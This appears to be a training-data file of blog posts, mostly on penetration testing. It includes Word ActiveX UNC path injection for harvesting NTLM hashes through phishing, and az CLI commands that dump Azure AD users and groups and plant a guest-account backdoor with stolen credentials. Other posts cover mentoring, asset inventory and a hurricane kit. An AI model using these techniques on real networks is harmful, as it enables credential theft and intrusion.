        "output": "Title: \"Having Fun with ActiveX Controls in Microsoft Word\"\nTaxonomies: \"Red Team, ActiveX Controls, Microsoft Word, Red Team, UNC path injection, Windows Media Player\"\nCreation Date: \"Thu, 30 Aug 2018 15:44:37 +0000\"\nMarcello Salvati//\n\nDuring Red Team and penetration tests, it\u2019s always important and valuable to test assumptions. One major assumption I hear from Pentesters, Red teamers and clients alike is that most networks (or their own network) block outbound SMB traffic. In my phishing payloads, I always try to inject a UNC path: If macros are disabled in the environment I\u2019m targeting, I might still be able to grab the users Net-NTLM hash if that assumption proves to be incorrect.\n\nUNC path injection in Word documents is by far nothing new. Over the years there have been multiple blog posts on how to achieve this. However, they all involved modifying the underlying XML of the document itself which made the process a little cumbersome and somewhat time-consuming.\n\nNot too long ago, I had some spare time and decided to play around with Word and see if I could find anything of interest (Inspired by some of the work that @subtee and @enigma0x3 were putting out at the time at WWHF), but I was also feeling really lazy, so I thought to myself I might get lucky and come across something interesting if I just start pressing the really really small/hidden buttons that people rarely don\u2019t use or see that often.\n\nTurns out, that\u2019s a totally valid method of finding awesomeness\u2026\n\nThe following has been tested on Windows 7 through 10 with the latest version of Office.\n\nUNC Path Injection Using Windows Media Player ActiveX Control\n\nOk, so first thing I might want to do is enable the Developer Tools. They aren\u2019t in the ribbon by default which means it\u2019s probably a good place to start looking:  File -> Options -> Customize Ribbon -> Scroll down the Right pane and check \u201cDeveloper Tools\u201d -> Ok and voila:\n\nAfter hovering over some of the buttons, the little toolbox with the screwdriver and wrench caught my eye especially when I read the description that said \u201cLegacy Tools\u201d (you had me at legacy\u2026):\n\nClicking that brought up another selection box:\n\nPlaying around with the \u201cLegacy Forms\u201d objects didn\u2019t prove to be fruitful. \u201cActive X Controls\u201d seems to be much more interesting: lo and behold yet another screwdriver and wrench icon, let\u2019s click that!\n\nDown the rabbit hole we go!  In keeping with the theme of \u201clooking for the things that people rarely use or see that often\u201d let\u2019s scroll this bad boy all the way down and see what the last few controls are:\n\nOooook, I have zero clue what any of these are (good sign), but I know what Windows Media player is! *click*\n\nI present to you Windows Media player in a Word Document; my mind is officially blown and I have so many questions. I have to at least get this to play something now, I\u2019m in too deep! Hmmm, there\u2019s a \u201cProperties\u201d in the right-click context menu:\n\nWoah! Hang on, now this went from funny to interesting really fast! There\u2019s a URL field! What happens if I just give it a UNC path? Will it try and authenticate to the server I specify? \n\nAnd sure enough, save, close, re-open the document and not only are there no security warnings, but we get a Net-NTLM hash!\n\nAttentive readers might have noticed there are a Height and Width field in that properties window as well, let\u2019s play the classic yet underappreciated game of \u201cFind the Windows Media Player in my Word Document\u201d:\n\nImpressive! I\u2019m pretty sure I won ;)\n\nUNC Path Injection Using \u201cShockWave Flash Object\u201d ActiveX Control\n\nIn that same \u201cMore controls\u201d menu, I discovered that the \u201cShockWave Flash Object\u201d ActiveX Control can be used for UNC path injection as well:\n\nInserting that into the document and bringing up its properties window shows us a lot of fields we can play around with. We\u2019re interested in the \u201cEmbedMovie\u201d and \u201cMovie\u201d fields: by setting the first field to true and the latter to a UNC path, we have the same results as before: the ActiveX control automatically authenticates to the server we specify when the document is opened. It also has the Height and Width fields so we can make this completely invisible too.\n\nFurther Research & Random Observations\n\nWhile playing around with these controls, I noticed a couple of things:\n\nIf the ActiveX control fails to connect to the specified SMB server, it will automatically fall over to WebDav (normal behavior with UNC paths, but interesting this is still the case with ActiveX controls)\n\nGiven an http[s] URL, they will perform an HTTP GET request to the specified resource. This could be incredibly interesting combined with a file format vulnerability in the Windows Media Player ActiveX control for example.\n\nWhile googling, I came across a very interesting blog post from 2016 titled \u201cRunning Macros Via ActiveX Controls\u201d. Turns out, as the title implies, you can use a lot of these controls to run macros using their built-in procedures instead of using \u201cthe usually reserved names such as AutoOpen() and Document_Open() to automatically run macros.\u201d\n\nThe great thing about this method is, the security warning prompt is completely different than the standard macro one, meaning users might fall for this if trained to only look for the macro warning.\n\nI\u2019ve tested this out on the latest version of Office and it still works. This is the prompt that gets displayed when opening a macro-enabled document that uses an ActiveX control to automatically run it. #PhishingProTip ;)\n\nI highly recommend reading the blog post, as the author even provides sample documents to play around with.\n\nDisclosure Timeline\n\nAlthough Microsoft has not addressed UNC path injections in Word in the past, I thought it would be best to report at least the Windows Media Player method to them as it\u2019s trivial to weaponize:\n\n2/23/2018 - Initial Report to MSRC\n\n2/25/2018 - Response from MSRC: assigned case number\n\n7/10/2018 - Response from MSRC: Issue closed as a \u201cdefense in depth fix\u201d\n\nFor the Blue Team\u2026\n\nObviously, the quick fix for this is to implement proper egress filtering and block SMB (port 445) outbound. If for some reason that isn\u2019t possible you can disable ActiveX controls entirely (just like macros) via Group Policy Preferences.\n\nPreferably you\u2019d want to do both!\n\nP.S If you\u2019re wondering why there aren\u2019t any security warnings when opening a document with the Windows Media Player or ShockWave Flash controls, at least from my understanding, it\u2019s because they aren\u2019t classified as Unsafe for Initialization (UFI).\n\nConclusion\n\nWe\u2019ve found two novel techniques (or at least two easier ways) to perform UNC path injections in Microsoft Word documents and potentially opened up a whole new (or old depending on your perspective) can of worms. ActiveX Controls in office products should absolutely be explored further by the security community as a whole, from my Google-Fu there doesn\u2019t seem to be a lot of research on these and I\u2019m almost certain this is just the tip of the Iceberg!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Red Teaming Microsoft: Part 1 - Active Directory Leaks via Azure\"\nTaxonomies: \"Author, Informational, Mike Felch, Red Team, Red Team Tools, Active Directory, Azure, reconnaissance, Red Team\"\nCreation Date: \"Fri, 31 Aug 2018 16:59:54 +0000\"\nMike Felch //\n\nWith so many Microsoft technologies, services, integrations, applications, and configurations it can create a great deal of difficulty just to manage everything. Now imagine trying to secure an environment that goes well beyond the perimeter. While moving everything to a cloud provider can provide amazing returns in scalability, functionality, and even savings, it can also create major blind-spots. Over the past year, I have been looking into ways to target organizations that utilize Microsoft as their cloud provider. I hope to release a number of different techniques that have been extremely beneficial in uncovering these blind-spots, much like the research Beau Bullock (@dafthack) and I did when we focused our scope on Google.\n\nI won\u2019t begin to mislead you, I am no Microsoft expert. In fact, the more I read about the products and services the more I felt lost. While over the past year I\u2019ve been able to maneuver through and bend these technologies in order to target the organizations better from a red team perspective, I struggled to try to understand many different concepts. What is the default configuration for this? Is this provided by default? Is this syncing with everything? If I make changes here, do they propagate back? Why not? The list goes on and on. When I\u2019ve shared some of these techniques privately it was inevitable that a question would immediately follow. While I feel bringing a problem without a solution is irresponsible, there may be times like now where solutions aren\u2019t black and white. My advice is to know your environment, know your technologies, and if you aren\u2019t sure then reach out to your service provider so you can be sure.\n\nThe Microsoft Landscape\n\nSo you\u2019ve been running Microsoft Active Directory and Exchange on-prem for years but want to quickly deploy Microsoft Office to your employees while also providing them with access to a webmail portal, Sharepoint, and SSO for some internal applications. Somewhere along the way, you decided to migrate to Office 365 and everything works well! All your users can authenticate with their network credentials and their email works great! Would you consider yourself an on-prem organization still or are you in the infamous cloud now? Maybe you took a hybrid approach and did both. Microsoft provides an amazing amount of integrations that they support but how do you know if you are managing everything correctly?\n\nA Hypothetical Complex Situation\n\nFor managing users on-prem there\u2019s the traditional Microsoft AD. For managing users in cloud services, you could leverage Azure AD. For mail, there\u2019s Exchange on-prem but you could always move email to Exchange online. If you want the full suite of Microsoft Office there\u2019s Office 365 but I think that routes through Exchange online in a Microsoft multi-tenant environment anyhow, so you could technically be using both but paying for one. Since you paid for Office 365 Business, you were also provided a number of services like Skype and OneDrive despite using GDrive or Box for corporate file sharing. You enroll in a multi-factor solution with SMS tokens being the default delivery mechanism but for some reason, your users can still authenticate with Outlook without needing MFA\u2026 weird.. (Major thanks to Microsoft EWS) Overall, everything just works and for that we have to thank Azure AD Connect.. or is it Azure AD Synchronization Services.. or are we still running old school DirSync with Forefront Identity Manager? Whatever it is, it\u2019s working and that\u2019s all that matters!\n\nSo.. What\u2019s the Big Deal?\n\nA number of problems are created in the situation just illustrated and there is very little a blue team can do to defend or respond to a number of different attacks ranging from dumping active directory remotely to bypassing and even hijacking multi-factor authentication for users.\n\nUnderstanding who is who within an organizational department is typically done in the reconnaissance phase of an engagement through third-party services like LinkedIn or other OSINT techniques. If you are on the internal network then revisiting this step is crucial because you need to understand deeper details of the organization like what groups are configured and who are the members of those groups. This is vital in being able to successfully pivot to relevant machines and targeting users based on their access so that escalation can be accomplished. But what if you aren\u2019t on the internal network but still need to determine who to target? Even better, what if the target gems of the organization are hosted in the cloud and you never actually have to hit the internal network?\n\nWith Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.\n\nStep 1) Authenticate to your webmail portal (i.e. https://webmail.domain.com/)\n\nStep 2) Change your browser URL to: https://azure.microsoft.com/\n\nStep 3) Pick the account from the active sessions\n\nStep 4) Select Azure Active Directory and enjoy!\n\nThis creates a number of bad situations. For instance, if we were able to export all the users and groups we would have a very nice list of employees and the groups they are a part of. We can also learn what group we need to land in for VPN, domain administration, database access, cloud servers, or financial data. What\u2019s also nice about Azure AD is that it holds the device information for each user so we can see if they are using a Mac, Windows machine, or iPhone along with the version information (i.e. Windows 10.0.16299.0). As if all this wasn\u2019t great already, we can also learn about all the business applications with their endpoints, service principal names, other domain names, and even the virtual resources (i.e. virtual machines, networks, databases) that a user might have access to.\n\nBut Wait, There\u2019s More!\n\nAn added benefit to authenticating to the Azure portal as a regular user is that you can create a backdoor\u2026 err... I mean a \u201cGuest\u201d account. How super convenient!\n\nStep 1) Click \u201cAzure Active Directory\u201d\n\nStep 2) Click \u201cUsers\u201d under the Manage section\n\nStep 3) Click \u201cNew Guest User\u201d and invite yourself\n\nDepending on their configuration, it may or may not sync back to the internal network. In fact, while creating guest accounts is on by default -- I\u2019ve only verified one customer where Azure AD Connect was a bi-directional sync allowing guest accounts to authenticate, enroll a multi-factor device and VPN internally. This is an important configuration component for you to understand since it can create a bad day.\n\nAzure for Red Teams\n\nAccessing the Azure portal through the web browser is great and has many awesome advantages but I have yet to find a way to export the information directly. I started to write a tool that would authenticate and do it in an automated fashion but it felt cumbersome and I knew with all of these awesome technologies tied together that Microsoft has solved this problem for me. There were a number of solutions I came across, some of them are:\n\nAzure CLI (AZ CLI)\n\nBeing a Linux user, I naturally gravitated towards AZ CLI. Partially because I pipe as much data into one-liners as possible and partially because I over-engineer tools in .NET. Using AZ CLI is a quick and easy way to authenticate against the OAUTH for Azure while also quickly exporting the raw data. In this post, we will focus on this solution.\n\nAzure Powershell\n\nWith a rise in awesome Powershell tools like Powershell Empire and MailSniper, I\u2019m amazed that Azure Powershell hasn\u2019t made its way into one of these tools. There are a massive number of Active Directory Cmdlets to interact with. To get started, simply install Azure RM Powershell then run: Connect-AzureRmAccount\n\nAzure .NET\n\nI am one of those weird nerds who grew up on Linux but wrote C# for a significant portion of my career. Because of this, having an Azure .NET library to interact with Active Directory is encouraging. I didn\u2019t dig too much into these libraries but from a high-level, it seems they are some sort of wrapper for the Active Directory Graph API.\n\nLet\u2019s Dig In!\n\nAs I previously mentioned, we will focus on interacting with Azure using AZ CLI. In order to get started, we have to first establish an active session with Azure. On red teams where the engagement involves an organization using Microsoft or Google services, I rarely try to go straight to a shell on the internal network. I will normally use a tool I wrote called CredSniper to phish credentials and multi-factor tokens than just authenticate as that user in pursuit of sensitive emails, files, access, information, and VPN.\n\nWill that presupposition, we will assume valid credentials were already obtained somehow.\n\nInstall AZ CLI\n\nYou will need to add the Microsoft source to apt (assuming Linux), install the Microsoft signing key, and then install Azure CLI:\n\nAZ_REPO=$(lsb_release -cs) echo \"deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main\" | sudo tee /etc/apt/sources.list.d/azure-cli.list\n\ncurl -L https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -\n\nsudo apt-get install apt-transport-https\n\nsudo apt-get update && sudo apt-get install azure-cli\n\nAuthentication via Web Session\n\nAfter everything is installed correctly, you will need to create a session to Azure using the credentials you already obtained. The easiest way to do that is by authenticating using ADFS or OWA in a normal browser then:\n\naz login\n\nThis will generate the OAUTH tokens locally, open a browser tab to the authentication page and let you select an account based on the ones you are already authenticated with. Once you select the account, the local OAUTH tokens will be validated by the server and you won\u2019t have to do that again unless they expire or get destroyed. You can also pass the --use-device-code flag which will generate a token you provide to https://microsoft.com/devicelogin.\n\nDumping Users\n\nNow on to my favorite part! There have been numerous techniques for extracting the GAL previously researched, such as using the FindPeople and GetPeopleFilter web service methods in OWA. These techniques have been an excellent resource for red teamers but they definitely have their limitations on what data is available, how long it takes to enumerate users, how loud it is due to the number of web requests required, and how it occasionally breaks. With AZ CLI, it\u2019s super easy to extract all the directory information for each user. In the examples below, I apply a JMESPath filter to extract the data I care about. I can also export as a table, JSON, or in TSV format!\n\nAll Users\n\naz ad user list --output=table --query='[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}'\n\nSpecific User\n\nIf you know the UPN of the target account, you can retrieve specific accounts by passing in the --upn flag. This is convenient if you are wanting to dig into the Active Directory information for a particular account. In the example below, you will notice I supplied the JSON format instead of the table output.\n\naz ad user list --output=json --query='[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}' --upn=''\n\nDumping Groups\n\nMy next favorite function is the ability to dump groups. Understanding how groups are used within an organization can provide specific insight into the areas of the business, the users, and who the admins are. AZ CLI provides a few useful commands that can assist here.\n\nAll Groups\n\nThe first thing I usually do is just export all the groups. Then I can grep around for certain keywords: Admin, VPN, Finance, Amazon, Azure, Oracle, VDI, Developer, etc. While there is other group metadata available, I tend to just grab the name and description.\n\naz ad group list --output=json --query='[].{Group:displayName,Description:description}'\n\nSpecific Group Members\n\nOnce you have reviewed the groups and cherry-picked the interesting ones, next it\u2019s useful to dump the group members. This will give you an excellent list of targets that are a part of the interesting groups -- prime targets for spear phishing! Against popular opinion, I have personally found that the technical ability and title do not lower the likelihood an intended target is more likely to avoid handing over their credentials (and even MFA token). In other words, everyone is susceptible so I usually target back-end engineers and devops teams because they tend to have the most access plus I can usually remain external to the network yet still access private GitHub/GitLab code repositories for creds, Jenkins build servers for shells, OneDrive/GDrive file shares for sensitive data, Slack teams for sensitive files and a range of other third-party services. Once again, why go internal if you don\u2019t have to.\n\naz ad group member list --output=json --query='[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}' --group=''\n\nDumping Applications & Service Principals\n\nAnother nice feature Microsoft provides is the ability to register applications that use SSO/ADFS or integrate with other technologies. A lot of companies utilize this for internal applications. The reason this is nice for red teamers is that the metadata associated with the applications can provide deeper insight into attack surfaces that may have not been discovered during reconnaissance, like URLs.\n\nAll Applications\n\naz ad app list --output=table --query='[].{Name:displayName,URL:homepage}'\n\nSpecific Application\n\nIn the below screenshot, you see we obtained the URL for the Splunk instance by examining the metadata associated with the registered application in Azure.\n\naz ad app list --output=json --identifier-uri=''\n\nAll Service Principals\n\naz ad sp list --output=table --query='[].{Name:displayName,Enabled:accountEnabled,URL:homepage,Publisher:publisherName,MetadataURL:samlMetadataUrl}'\n\nSpecific Service Principal\n\naz ad sp list --output=table --display-name=''\n\nAdvanced Filtering with JMESPath\n\nYou might have noticed in the above examples that I try to limit the amount of data that is returned. This is mainly because I try to snag what I need instead of everything. The way AZ CLI handles this is by using the --query flag with a JMESPath query. This is a standard query language for interacting with JSON. I did notice a few bugs with AZ CLI when combining the query flag with the \u2018show\u2019 built-in functions. The other thing to note is that the default response format is JSON which means if you plan on using a query filter you need to specify the correct case-sensitive naming conventions. There was a bit of inconsistency between the names for the different formats. If you used the table format, it might capitalize when JSON had lowercase.\n\nDisable Access to Azure Portal\n\nI spent a bit of time trying to make sense of what to disable, how to prevent access, how to limit, what to monitor, and even reached out to people on Twitter (thanks Josh Rickard!). I appreciate all the people who reached out to help make sense of this madness. I suppose I should learn the Microsoft ecosystem more, in hopes of offering better suggestions. Until then, I offer you a way to disable the Azure Portal access to users. I haven\u2019t tested this and can\u2019t be sure if this includes AZ CLI, Azure RM Powershell, and the Microsoft Graph API but it\u2019s definitely a start.\n\nStep 1) Log in to Azure using a Global Administrator account https://portal.azure.com\n\nStep 2) On the left panel, choose \u2018Azure Active Directory\u2019\n\nStep 3) Select \u2018Users Settings\u2019\n\nStep 4) Select \u2018Restrict access to Azure AD administration portal\u2019\n\nAn alternative is to look into Conditional Access Policies: https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview\n\nComing Soon!\n\nThere are a number of different tools out there for testing AWS environments and even new tools that have come out recently for capturing cloud credentials like SharpCloud. Cloud environments seem to be a commonly overlooked attack surface.\n\nI will be releasing a (currently private) red team framework for interacting with cloud environments, called CloudBurst. It\u2019s a plugginable framework that gives users the ability to interact with different cloud providers to capture, compromise, and exfil data.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Find an InfoSec Mentor\"\nTaxonomies: \"Author, Brian King, How-To, Informational, InfoSec 101, FAQ, general infosec, General Questions, getting started, mentor, new to infosec\"\nCreation Date: \"Wed, 05 Sep 2018 15:55:53 +0000\"\nBB King //\n\nWe got an email from a fan today asking how best to find a mentor in information security. Maybe you're looking for a mentor too. It's a great question.\n\nMuch of the advice you see for people looking to make their start in infosec is something like, \"Work at the helpdesk or in system administration for a while.\" This gives you a chance to see computer systems and networks at work in the real world, and to experience their limitations first-hand. It's good advice. The only problem with it is that there is no clear signal telling you when you're ready to move on. Systems administration is a career in itself. We need these people! But if you want to use it as a stepping-stone to other things, how do you know when you've learned enough?\n\nThere are careers with a clear path of advancement. In the trades (carpenter, electrician, plumber, etc) it's apprentice, journeyman, master. For the true professions, (doctor, lawyer, accountant, etc) there's higher education, internships, exams, an oath, and acceptance in a professional society. It seems like \"a career\" is what you end up with after you've completed some third-party validated set of requirements.\n\nIn information security, we don't have that, and sometimes it feels like it's missing. Maybe a mentor could take the place of all the structure and clarity we don't have built-in. If so, then \"finding a mentor\" seems like just the thing to fill the gap between \"No accepted formal path,\" and \"...but I don't know enough yet!\"\n\nOr perhaps not.\n\n\"Mentor\" implies a deep and long-lasting relationship, and invites a heavy influence on you. Consider some lighter-weight options:\n\nMaybe you want a partner to work on a project.\n\nMaybe you want a peer to talk with over lunches.\n\nMaybe you want a friend or a coach to help you set goals and hold you accountable for progress.\n\nMaybe you want a place where helpful people hang around.\n\nMaybe this \u201cmentor\u201d doesn\u2019t have to be a single person at all.\n\nThe path to entering one of the true professions can be attractive because it's so clear. But there are lots of paths to a career in information security. Don't be too quick to accept someone else's path as the right one for you.\n\nBefore you decide that a mentor is what you need, first decide what you expect out of the relationship - on both sides. Be clear in your own mind so you can be clear when you pop the question. Then look for someone local to you. Approach someone you already know or whose path crosses yours regularly. Find a more senior security person at your company or someone in a local security-related meetup. Describe the role you have in mind for a mentor, how you plan to fill your complementing role and ask them if they'd be willing to build a relationship like that with you.\n\nWhichever route you choose, there's one thing you can do that can help you develop your reputation and consolidate what you learn: Share what you're working on. Blogging is still the best outlet. Your blog will be a body of work you can point to that says, \"Look at this: I'm doing the best I can, in these particular areas. I'm doing better now than I was six months ago.\" Produce something that proves you're not only willing to do to the hard work (because lots of people say that), but that you're already doing it. Post whatever you did on your project this week, even if it feels like a series of failures. If you spun up a Digital Ocean droplet, installed some software, and got your blog running there, then that's your first post: \u201cHow I Set Up My Blog and Why I Chose What I Chose.\u201d Show your thought process.\n\nA good mentoring relationship can get you guidance and encouragement that you can't get anywhere else. But you may find that you don't really need something so heavy and involved as a \"mentor\" after all. Maybe you just need a little bit of focused interaction with others now and then as you learn for yourself that we're all just making it up as we go, and you can make stuff up, too...\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Do You Know What Devices Are on Your Network?\"\nTaxonomies: \"Informational\"\nCreation Date: \"Thu, 13 Sep 2018 15:32:02 +0000\"\nBryan Strand//\n\nI have recently started taking SEC566 with James Tarala via SANS on the CSC 20 Critical Controls and decided it would be a great blog series to do a quick overview of each of the controls, and how you could start implementing them on your network. This is by no means an in-depth breakdown of each control, but more of a quick read to get you thinking about what you are currently doing, or what you can start doing to shore up your defenses.\n\nCSC #1 Inventory and Control of Hardware Assets\n\nEven though it seems a simple enough question, many organizations struggle with knowing what devices are on their network. But, if you think about it, how can you possibly begin to think about defending your network if you don\u2019t know what to defend in the first place? This should probably be where a security team starts if they want to begin down the path of defending their network. Even if you are a highly mature security team but aren\u2019t doing this, START NOW. Because it can be hard. Let\u2019s break down some great ways to do this.\n\nA good place to start is by setting up an active discovery tool. Don\u2019t feel bad about using a vulnerability scanner here like Nessus, Qualys, or Nexpose to help create an inventory. They do the job quite well, and if you are already using one you don\u2019t have to worry about forking out the extra money to buy an active discovery tool that does this exclusively. Although there are some great tools like Tanium that can do this very well\u2026 at a cost. Even Nmap with Ndiff can do this for you, and they are completely free. In conjunction with an active discovery tool, you also want to implement a passive discovery tool. IPAM is a great place to start and there are several to look into. With these two you now have:\n\nA way to go around your network intentionally looking for devices connecting to your network.\n\nAnother monitoring broadcast traffic on your network. Think Bro with user agent strings.\n\n Bro capturing IP address and Services \n\n Bro capturing User Agent Strings \n\nThe above two screenshots highlight how Bro can passively capture information about systems on your network.  \n\nNext, you may want to enable DHCP logging on your network. The average bad guy generally sits on a network several months (around 270 days according to Madiant) before they get discovered. Without DHCP logging, it can be incredibly difficult to go back and look at the information on a particular IP address from a potential incident several months ago. So what are you supposed to do with this inventory and logging?\n\nSimply just having this information sitting on a log or file somewhere isn\u2019t going to be much help. Information about what devices are on your network is cool and all, but information ABOUT the devices on your network is much much cooler and can save a ton of time.\n\nEach device on your network should also have accompanying information linked to it like:\n\nThe name of the device\n\nData asset owner (who commissioned that machine)\n\nHardware address\n\nNetwork address\n\nIf that device has even been approved to be on the network in the first place\n\nAny other information you and your team find valuable\n\nIt should go without saying, but when information like this is put together and a device accesses your network that isn\u2019t authorized, make sure there is a plan in place to remove that device in a time frame that is agreed upon by your team or to authorize it.  It also can help answer the question...  What is this?\n\nNow that we have captured this information, let\u2019s look at a more preventative approach to devices trying to get on your network, and how to secure that. Two great practices for your organization should be to require 802.1x and NAC,  and client-side certificates to authenticate connecting to your network. This doesn\u2019t just mean endpoint laptops and desktops, but servers and phones as well.\n\nYou most likely will be looking into a commercial solution like Cisco ISC or ForeScout for this. But, remember implementing the controls is about finding the quick easy wins and working your way up to more complicated solutions.  Just consider a commercial NAC solution a future point on your security roadmap.\n\nNow, at this point I know some readers might feel a little overwhelmed with where to even begin with this, or feel like this just isn\u2019t possible.\n\nI have had several conversations with individuals who are the only security personnel for their company. Tackling this first step alone can be daunting, and it might seem like you will have to break the budget to get started. Or, you might also be thinking that you got this locked down and completely figured out. Either way, I wanted to provide some free or open source tools that are available for you to get a better handle on this task. Automation is optimal here, but if money is an issue, then check out these free tools below:\n\nNmap\n\nOSSIM\n\nSpiceworks\n\nPacketFence\n\nOpenNAC\n\nOn a final note, there is no need to rush this. Don\u2019t give up nights, weekends, or holidays with family, just because you can\u2019t convince management to throw down some money to help automate this or get a tool to help you. This shouldn\u2019t be something you worry about getting perfect by next week. Security isn\u2019t a destination, it\u2019s a process, and this is just the first step for what you can do to get a handle on it.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Digital Bug Out Bag: A Nerd and His Family Running From a Hurricane\"\nTaxonomies: \"Author, Derek Banks, Fun & Games, Informational, disaster preparedness, emergency, hurricane, hurricane florence, what to pack for a hurricane\"\nCreation Date: \"Thu, 20 Sep 2018 14:22:22 +0000\"\nDerek Banks//\n\nI live in an area that was initially projected to be hit by Hurricane Florence. Four days prior to the storm making landfall the governor of my state issued a mandatory evacuation for the zone that I live in. The floor of my house is about nine feet above sea level and there is a ditch in my backyard that fills up when tidal flooding occurs. During a hurricane that stayed offshore a few years ago, this was someone kayaking through my backyard during high tide.\n\nThe reports were that the storm could bring a 13 foot plus storm surge, the picture above was 3 feet above normal high tide, so it seemed plausible that we could get flooded. All part of the joy of living on the coast!\nMy wife and I had rode out hurricanes and \u201cnor\u2019easters\u201d in the past (for those not on the East Coast sometimes the nor\u2019easters can be as bad and even worse than hurricanes). If it were just us, we may have stayed, but with two kids, we decided leaving was a better idea. Our plan was to find a hotel inland a bit, away from the flooding, but not too far so we could have a better chance of making it home right after the storm to get to work on cleanup and recovery. Time to pack up a bug out bag!\nBut what to pack? Since the family (wife, two kids, and pets) were headed to an inland hotel, shelter was taken care of. Our main concerns were power for devices, communication, lighting, and water. When my wife and I stayed put for Isabel in 2003, the conditions were similar to what was happening with Florence, a lot of rain all summer making the ground soft, and leading to a lot of downed trees and powerlines.\nBack in 2003, power was important for sure (I remember borrowing battery backups from the servers at work) but our lives are even more dependant now on digital devices especially for communication. These days, if your smartphone dies, you\u2019re not going to easily call anyone. I can\u2019t remember the last time I saw a pay phone in my area! For emergency purposes, this is probably the most important item in the bag though it probably really lives in your pocket.\nAlso, I thought it would be a good idea to keep devices that would keep the kids\u2019 minds off the emergency such as their Nintendo Switches and cell phones (yes, my kids already have cell phones).\nAs with the Physical Pentest Gobag talk from 2017, I used the 36 liter version of the GoRuck GR2. That\u2019s generally the bag I use for travel and it has plenty of room and it comfortable to carry. Also, I am pretty sure it is bomb proof.\n\nFor communication related devices I packed the following:\n\nSmartphone\nGrundig FR200 emergency radio\nBaofeng UV-5RA Two-way radio\nWiFi Hotspot\n\nI figured that if the power did go out, I would be able to tune into radio stations with the Grundig FR200, its out of production (I\u2019ve had it a long time). But similar radios are not that expensive. Plus it can receive some shortwave signals and has a hand crank and rechargeable battery.\nI threw in the Baofeng two way radio just in case if it did get really bad, there may be repeaters around that were still functional (I had preprogrammed some repeaters on the radio with Chirp, plus had a relatively recent repeater directory in my truck).\nThe WiFi hotspot is something I usually take on travel anyway because I am usually untrusting of wireless networks and use my own if I can help it.\nFor power related items I had a collection of micro usb, lighting, and USB-C. There seem to be more that necessary in the picture - that's\u2019 because I had cables for my wife\u2019s and kids\u2019 devices as well as I figured that they may potentially forget to bring some - my youngest brought eight Barbie dolls when I told her to go pack up items she thought were necessary and essential!\nIn addition to the cables I had a Belkin travel surge protector with two USB ports and three outlets on it. I thought this would be enough to keep devices and batteries topped off with charge while there was still power. Combined with some other wall warts, this turned out to be the case for the most part. But the outlet above the table in the hotel room did look similar to the Clark Griswold Christmas Vacation lighting outlet for the trip.\n\nI packed two 10000 mA battery packs and a folding RAVPower folding solar panel with two outputs. I used the solar panel on a past hunting trip and it was able to mostly charge the battery I had at the time during the course of the day. The Dark Energy Poseidon battery pictured above seemed to be able to charge my iPhone two times when full.\nKeeping devices charged was an issue even with power, though if it came down to it, some of the less critical items (like the Switches) would have to wait in line behind phones.\nAll the devices that could be charged (and I may be missing something) :\n\nOne laptop\nFour cell phones\nTwo battery packs\nMiFi\nTwo Nintendo Switches\nThree Bluetooth headphones\nGoPro Camera and batteries\nTwo-way radio\nAmazon Kindle and two other tablets\nTwo Apple Watches\n\nThe next time around I would likely bring two small power adapter extension cords for the power strip to make room for larger adapters if I needed to.\nI also brought a GoPro Hero 5 because I thought it would be good for documentation if necessary as well as a lightweight backpacking tripod, extension stick, and head mount. I was in the middle of a good book, so I brought my Kindle Oasis along too.\nTwo important items that thankfully did not need to be charged were a headlamp and Surefire flashlight (spare batteries were in the truck). The kids and wife also had flashlights in their bags.\nI also brought my Thinkpad Carbon X1. Hey, computer geeks are going to bring computers right? It is the lightest computer I have ever owned, and claims to have some level of protection against the elements, not that I have ever purposely tested that.\nJust in case I had to walk in the soaking rain for any length of time, I brought a North Face rain jacket (not pictured) and LOKSAK bags for the laptop and other electronics. I also had a Columbia River Tools pocket knife - a knife always comes in handy.\nLastly I brought two collapsable Platypus 1 liter water containers. Even though we had bottled water in a cooler, I like these because when empty they weigh very little and are reusable.\nIn the end, the storm thankfully missed my area and went further south. I say that knowing full well that my good fortune meant that someone else did not have the good luck to not get hit by a major hurricane. Both the event and the aftermath are terrible experiences to have to go through and I wish everyone affected the best of luck with recovering from it.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Career in Information Security: FAQ (Part 1)\"\nTaxonomies: \"Informational, InfoSec 101, career path, college, FAQ, Getting into Infosec, getting started, infosec 101\"\nCreation Date: \"Thu, 27 Sep 2018 18:42:00 +0000\"\nStaff//\n\nWe recently received an email from someone working on their degree who had some questions for whichever tester we could round up. They were great questions and since we get asked similar things quite frequently we decided to create a 2-part blog post answering them with the help of several testers. See what they had to say about their own journey and don't forget to check out Part 2 on Monday!\n\n1)What initially inspired you to pursue your career in information security?\n\nThe only thing more exciting about interdepartmental business processes is breaking interdepartmental business processes and exploiting them. - Kent Ickler\n\nBefore specifically being interested in InfoSec I knew from a very young age that I wanted to at least work with computers. My family wasn't all that technical regarding computers but we had a few throughout my childhood that really sparked my initial interest. We had an Apple IIe that I spent a lot of time trying to figure out. I talked my dad into letting me order a \"Build-Your-Own-Computer\" kit around the age of ten or so and built it by myself (incorrectly, but I learned a lot). It wasn't until college though that I found out that computer security is what I wanted to pursue. I took a course on Ethical Hacking and learned that I could hack companies legally and get paid for it. Now that's what I do. - Beau Bullock\n\nMy dad inspired me. He was a low-level firmware engineer so I grew up in a house where our kitchen table was full of the hardware he was reverse engineering, dumping EEPROM's, creating binary patches, and even \"backing up\" my Nintendo games. Between the PC just being released and the exposure to the consistent tinkering, I quickly adopted a very similar mindset and began trying to figure out how technology worked under the hood. - Mike Felch\n\nI got an email 